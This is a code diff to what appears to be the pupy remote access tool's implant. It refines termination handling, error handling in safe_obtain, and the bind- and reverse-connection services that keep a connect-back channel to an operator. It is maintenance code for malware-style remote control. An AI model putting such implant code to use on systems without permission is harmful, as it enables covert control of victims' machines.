@@ -429,6 +429,7 @@ setattr(pupy, 'manager', Manager(PStore()))
 setattr(pupy, 'Task', Task)
 setattr(pupy, 'connected', False)
 setattr(sys, 'terminated', False)
+setattr(sys, 'terminate', None)
 
 def safe_obtain(proxy):
     """ safe version of rpyc's rpyc.utils.classic.obtain, without using pickle. """
@@ -436,7 +437,11 @@ def safe_obtain(proxy):
     if type(proxy) in [list, str, bytes, dict, set, type(None)]:
         return proxy
 
-    conn = object.__getattribute__(proxy, "____conn__")()
+    try:
+        conn = object.__getattribute__(proxy, "____conn__")()
+    except:
+        return proxy
+
     if not hasattr(conn, 'obtain'):
         setattr(conn, 'obtain', conn.root.msgpack_dumps)
 
@@ -538,7 +543,12 @@ class ReverseSlaveService(Service):
 
     def exposed_exit(self):
         sys.terminated = True
-        self._conn.close()
+
+        if self._conn:
+            self._conn.close()
+
+        if sys.terminate:
+            sys.terminate()
 
     def exposed_register_cleanup(self, method):
         self.exposed_cleanups.append(method)
@@ -627,9 +637,6 @@ class ReverseSlaveService(Service):
 class BindSlaveService(ReverseSlaveService):
 
     def on_connect(self):
-        self.exposed_namespace = {}
-        self.exposed_cleanups = []
-        self._conn._config.update(REVERSE_SLAVE_CONF)
         import pupy
         try:
             from pupy_credentials import BIND_PAYLOADS_PASSWORD
@@ -643,8 +650,8 @@ class BindSlaveService(ReverseSlaveService):
             self._conn.close()
             raise KeyboardInterrupt("wrong password")
 
-        pupy.namespace = UpdatableModuleNamespace(self.exposed_getmodule)
-        self._conn.root.set_modules(pupy.namespace)
+        super(BindSlaveService, self).on_connect()
+
 
 def get_next_wait(attempt):
     if attempt < 120:
@@ -653,7 +660,6 @@ def get_next_wait(attempt):
         return random.randint(30, 50) / 10.0
     else:
         return random.randint(150, 300) / 10.0
-
 
 def set_connect_back_host(HOST):
     import pupy
@@ -807,8 +813,13 @@ def rpyc_loop(launcher):
                     transport_kwargs=transport_kwargs,
                     pupy_srv=None,
                 )
-                s.start()
+
+                sys.terminate = s.close
                 pupy.connected = True
+
+                s.start()
+                sys.terminate = None
+                pupy.connected = False
 
             else:  # connect payload
                 stream = ret
